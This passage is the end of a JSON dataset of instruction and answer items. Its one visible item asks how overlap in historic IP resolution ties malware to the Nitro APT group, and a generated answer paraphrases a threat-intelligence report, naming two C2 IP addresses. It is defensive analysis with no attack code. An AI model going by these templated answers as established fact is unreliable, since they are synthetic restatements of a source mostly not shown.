re-using old C2 infrastructure with their new malware.\nFor Palo Alto Networks customers, all of these files were properly identified by WildFire as malware and all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems.\n\nHow does the use of historic IP resolution overlap help in identifying and attributing malware activity to the Nitro APT group?",
    "output": "The use of historic IP resolution overlap helps in identifying and attributing malware activity to the Nitro APT group by tracking the domains that resolve to specific IP addresses known to be associated with the group. For instance, the domains alternately resolving to either 223.25.233.248 or 196.45.144.12 indicate that Nitro is in control of these domains. This method allows Infosec teams to easily reach the same conclusion, thereby negating the effectiveness of the group's use of previously unreported domains and IPs for command and control (C2), as well as new families of malware like PCClient.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  }
]